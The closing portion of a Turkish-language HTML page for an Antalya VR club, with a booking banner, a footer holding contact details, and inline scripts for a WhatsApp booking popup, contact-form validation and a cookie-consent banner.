                                  <div class="cinkes_progress_single pt-30">
                                      <div class="progress_label wow fadeInLeft" data-wow-duration="0.9s">
                                          <h5>Uygun Fiyat</h5>
                                      </div>
                                      <div class="progress">
                                          <div class="progress-bar wow fadeInLeft" data-wow-duration="0.9s" role="progressbar" data-width="85%" aria-valuenow="85" aria-valuemin="0" aria-valuemax="100"><span>85%</span></div>
                                        </div>
                                  </div>
  
                              </div>
  
                          </div>
  
                       </div>
                   </div>
               </div>
            </div>
        </div>

        <div class="cinkes_cta_area pt-120 pb-90" data-background="assets/img/bg/cta_bg.jpg">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-xl-8 col-lg-8">
                        <div class="cinkes_cta_content mb-30 text-center text-lg-start">
                            <span class="cinkes_cta_subtitle">şimdi rezervasyon yapın</span>
                            <h4 class="cinkes_cta_title">VR Maceranızı Başlatın</h4>
                        </div>
                    </div>
                    <div class="col-xl-4 col-lg-4">
                        <div class="cinkes_cta_button mb-30 text-center text-lg-end">
                            <a href="contact.html" class="cinkes_cta_btn i_right">Saat rezervasyonu yap<i class="fal fa-sign-out"></i></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    
  <div class="cinkes_footer_area">
           
    <div class="cinkes_footer_widget_area pt-45">
            <div class="container">
                <div class="cinkes_footer_border_bottom">
                <div class="row">
                    <div class="col-xl-4 col-lg-12 col-md-12">
                        <div class="cinkes_footer_widget cinkes_footer_info mb-40">
                            <p>Antalya'nın en yeni VR kulübünde unutulmaz bir deneyim yaşayın.  Son teknoloji cihazlarımızla sanal dünyaya girebilirsiniz.</p>
                            <div class="cinkes_footer_newsletter_form mt-35">
                                <a href="javascript:void(0)" onclick="openWhatsAppForm()" class="cinkes_btn theme_bg black_hover">WhatsApp'tan Yaz</a>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-md-4 col-sm-6">
                        <div class="cinkes_footer_widget footer_widget_list mb-40 ml-90">
                            <h4 class="cinkes_footer_title">Keşfet</h4>
                            <ul>
                                <li><a href="/">Ana Sayfa</a></li>
                                <li><a href="service.html">VR Oyunları</a></li>
                                <li><a href="pricing.html">Fiyatlar</a></li>
                                <li><a href="contact.html">İletişim</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-xl-2 col-lg-4 col-md-4 col-sm-6">
                        <div class="cinkes_footer_widget footer_widget_list mb-40">
                            <h4 class="cinkes_footer_title">Yasal</h4>
                            <ul>
                                <li><a href="privacy.html">Gizlilik Politikası</a></li>
                                <li><a href="terms.html">Kullanım Koşulları</a></li>
                                <li><a href="cookies.html">Çerez Politikası</a></li>
                              
                            </ul>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 col-md-4">
                        <div class="cinkes_footer_widget mb-40">
                            <h4 class="cinkes_footer_title">Sorularınız mı var?</h4>
                            <div class="cinkes_footer_contact_single">
                                <h5 class="cinkes_footer_contact-single_title">Rezervasyon</h5>
                                <a href="tel:+905324567891">+90 532 456 78 91</a>
                            </div>
                            <div class="cinkes_footer_contact_single">
                                <h5 class="cinkes_footer_contact-single_title">Email Gönder</h5>
                                <a href="mailto:info@ziravox.com">info@ziravox.com</a>
                            </div>
                            <div class="cinkes_footer_contact_single">
                                <h5 class="cinkes_footer_contact-single_title">Adres</h5>
                                <a href="https://maps.app.goo.gl/wz5js8yKF3qVxXQS7" target="_blank">Yenigün, 1069. Sk. No:4, 07310 Muratpaşa/Antalya</a>
                            </div>
                        </div>
                    </div>

                </div>
            </div>
        </div>
    </div>
    <div class="cinkes_footer_copyright_area pt-40 pb-40">
        <div class="container">
            <div class="row">
                <div class="col-xl-12 col-lg-12 text-center">
                    <p class="mb-0">Copyright © 2025 Ziravox. Tüm Hakları Saklıdır.</p>
                </div>
             
            </div>
        </div>
    </div>
</div>

        <div class="cinkes-dark-light-view-box has-clicked">
            <div class="cinkes-dark-light-view-toogle-dot"></div>
        </div>

        <div class="progress-wrap">
            <svg class="progress-circle svg-content" width="100%" height="100%" viewbox="-1 -1 102 102">
            <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"></path>
            </svg>
        </div>

        <script src="assets/js/jquery.min.js"></script>
        <script src="assets/js/bootstrap.bundle.min.js"></script>
        <script src="assets/js/swipper-bundle.min.js"></script>
        <script src="assets/js/jquery.meanmenu.min.js"></script>
        <script src="assets/js/wow.min.js"></script>
        <script src="assets/js/admin.js"></script>
        <script src="assets/js/jquery.nice-select.min.js"></script>
        <script src="assets/js/jquery.scrollUp.min.js"></script>
        <script src="assets/js/jquery.magnific-popup.min.js"></script>
        <script src="assets/js/odometer.min.js"></script>
        <script src="assets/js/appear.min.js"></script>
        <script src="assets/js/back-to-top.min.js"></script>
        <script src="assets/js/imagesloaded.pkgd.min.js"></script>
        <script src="assets/js/main.js"></script>
        <script src="assets/js/admin.js"></script>
        <script>
            function openWhatsAppForm() {
                const modal = document.createElement('div');
                modal.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.5);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    z-index: 9999;
                `;
                
                const form = document.createElement('div');
                form.style.cssText = `
                    background: white;
                    padding: 30px;
                    border-radius: 10px;
                    width: 90%;
                    max-width: 400px;
                    text-align: center;
                `;
                
                form.innerHTML = `
                    <h3 style="color: #8a2be2; margin-bottom: 20px;">WhatsApp Rezervasyon</h3>
                    <p style="margin-bottom: 20px; color: #666;">Bilgilerinizi girin, sizinle WhatsApp üzerinden iletişime geçeceğiz.</p>
                    
                    <div style="margin-bottom: 15px;">
                        <input type="text" id="whatsappName" placeholder="Adınız Soyadınız" 
                               style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px;">
                    </div>
                    
                    <div style="margin-bottom: 20px;">
                        <input type="tel" id="whatsappPhone" placeholder="+90 555 123 45 67" 
                               style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px;">
                    </div>
                    
                    <div style="display: flex; gap: 10px; justify-content: center;">
                        <button onclick="submitWhatsAppForm()" 
                                style="background: #8a2be2; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px;">
                            Gönder
                        </button>
                        <button onclick="closeWhatsAppForm()" 
                                style="background: #666; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px;">
                            İptal
                        </button>
                    </div>
                `;
                
                modal.appendChild(form);
                document.body.appendChild(modal);
                
                setTimeout(() => {
                    document.getElementById('whatsappName').focus();
                }, 100);
            }
            
            function submitWhatsAppForm() {
                const name = document.getElementById('whatsappName').value.trim();
                const phone = document.getElementById('whatsappPhone').value.trim();
                
                if (!name || !phone) {
                    alert('Lütfen adınızı ve telefon numaranızı girin.');
                    return;
                }
                
                alert(`Teşekkürler ${name}! En kısa sürede ${phone} numarasından sizinle iletişime geçeceğiz.`);
                closeWhatsAppForm();
            }
            
            function closeWhatsAppForm() {
                const modal = document.querySelector('div[style*="position: fixed"]');
                if (modal) {
                    modal.remove();
                }
            }
            
            document.addEventListener('click', function(e) {
                if (e.target.style && e.target.style.position === 'fixed') {
                    closeWhatsAppForm();
                }
            });
            
            function handleContactForm(event) {
                event.preventDefault();
                
                const name = document.getElementById('contactName').value.trim();
                const email = document.getElementById('contactEmail').value.trim();
                const phone = document.getElementById('contactPhone').value.trim();
                const subject = document.getElementById('contactSubject').value;
                const message = document.getElementById('contactMessage').value.trim();
                
                resetFieldErrors();
                
                let hasErrors = false;
                
                if (!name) {
                    highlightFieldError('contactName');
                    hasErrors = true;
                }
                
                if (!email) {
                    highlightFieldError('contactEmail');
                    hasErrors = true;
                }
                
                if (!phone) {
                    highlightFieldError('contactPhone');
                    hasErrors = true;
                }
                
                if (!message) {
                    highlightFieldError('contactMessage');
                    hasErrors = true;
                }
                
                if (hasErrors) {
                    return;
                }
                
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(email)) {
                    highlightFieldError('contactEmail');
                    return;
                }
                
                const phoneRegex = /^\+?[0-9\s\-\(\)]{10,}$/;
                if (!phoneRegex.test(phone)) {
                    highlightFieldError('contactPhone');
                    return;
                }
                
                showPopup('Mesajınız başarıyla gönderildi! En kısa sürede sizinle iletişime geçeceğiz.', 'success');
                
                document.getElementById('contactForm').reset();
            }
            
            function highlightFieldError(fieldId) {
                const field = document.getElementById(fieldId);
                if (field) {
                    field.style.borderColor = '#dc3545';
                    field.style.backgroundColor = '#fff5f5';
                }
            }
            
            function resetFieldErrors() {
                const fields = ['contactName', 'contactEmail', 'contactPhone', 'contactSubject', 'contactMessage'];
                fields.forEach(fieldId => {
                    const field = document.getElementById(fieldId);
                    if (field) {
                        field.style.borderColor = '';
                        field.style.backgroundColor = '';
                    }
                });
            }
            
            function showPopup(message, type) {
                const modal = document.createElement('div');
                modal.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.5);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    z-index: 9999;
                `;
                
                const popup = document.createElement('div');
                const bgColor = type === 'success' ? '#28a745' : '#dc3545';
                const icon = type === 'success' ? '✓' : '✗';
                
                popup.style.cssText = `
                    background: white;
                    padding: 30px;
                    border-radius: 10px;
                    width: 90%;
                    max-width: 400px;
                    text-align: center;
                    border-top: 5px solid ${bgColor};
                `;
                
                popup.innerHTML = `
                    <div style="font-size: 48px; color: ${bgColor}; margin-bottom: 15px;">${icon}</div>
                    <h3 style="color: ${bgColor}; margin-bottom: 15px;">${type === 'success' ? 'Başarılı!' : 'Hata!'}</h3>
                    <p style="color: #666; margin-bottom: 20px;">${message}</p>
                    <button onclick="closePopup()" 
                            style="background: ${bgColor}; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px;">
                        Tamam
                    </button>
                `;
                
                modal.appendChild(popup);
                document.body.appendChild(modal);
                
                if (type === 'success') {
                    setTimeout(() => {
                        closePopup();
                    }, 5000);
                }
            }
            
            function closePopup() {
                const modal = document.querySelector('div[style*="position: fixed"]');
                if (modal) {
                    modal.remove();
                }
            }
        </script>
        <div id="cookieConsentBanner" style="position:fixed;bottom:0;left:0;width:100%;background:#222;color:#fff;padding:20px 10px;z-index:99999;display:none;box-shadow:0 -2px 10px rgba(0,0,0,0.1);text-align:center;">
  Bu site, deneyiminizi geliştirmek için çerezleri kullanır. <a href="cookies.html" style="color:#8a2be2;text-decoration:underline;">Daha fazla bilgi</a>
  <button id="cookieAcceptBtn" style="margin-left:20px;padding:8px 18px;background:#8a2be2;color:#fff;border:none;border-radius:5px;cursor:pointer;">Kabul Et</button>
  <button id="cookieDeclineBtn" style="margin-left:10px;padding:8px 18px;background:#666;color:#fff;border:none;border-radius:5px;cursor:pointer;">Reddet</button>
</div>
<script>
function setCookie(name,value,days){var d=new Date();d.setTime(d.getTime()+(days*24*60*60*1000));var expires="expires="+d.toUTCString();document.cookie=name+"="+value+";"+expires+";path=/";}
function getCookie(name){var n=name+"=";var ca=document.cookie.split(';');for(var i=0;i<ca.length;i++){var c=ca[i].trim();if(c.indexOf(n)==0)return c.substring(n.length,c.length);}return "";}
function showCookieBanner(){if(getCookie('ziravox_cookie_consent')==="")document.getElementById('cookieConsentBanner').style.display='block';}
document.getElementById('cookieAcceptBtn').onclick=function(){setCookie('ziravox_cookie_consent','accepted',365);document.getElementById('cookieConsentBanner').style.display='none';};
document.getElementById('cookieDeclineBtn').onclick=function(){setCookie('ziravox_cookie_consent','declined',365);document.getElementById('cookieConsentBanner').style.display='none';};
window.addEventListener('DOMContentLoaded',showCookieBanner);
        </script>
    </body>
</html>